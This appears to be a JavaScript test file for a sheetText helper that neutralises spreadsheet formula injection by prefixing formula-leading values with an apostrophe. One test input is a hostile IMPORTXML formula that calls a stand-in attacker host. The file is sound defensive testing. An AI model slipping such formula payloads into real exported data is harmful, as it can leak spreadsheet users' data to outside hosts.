import assert from 'node:assert/strict'
import { test } from 'node:test'

import { sheetText } from '../supabase/functions/_shared/sheetText.js'

test('prefixes formula-leading text after whitespace', () => {
  for (const value of ['=IMPORTXML("https://attacker.invalid")', '  +1+1', '\t-2+2', '\uFEFF@SUM(A1)']) {
    assert.equal(sheetText(value), `'${value}`)
  }
})

test('preserves ordinary strings and converts non-string values safely', () => {
  assert.equal(sheetText('UvA-IN'), 'UvA-IN')
  assert.equal(sheetText(2026), '2026')
  assert.equal(sheetText(null), '')
})

test('limits output length', () => {
  assert.equal(sheetText('a'.repeat(10), 4), 'aaaa')
})
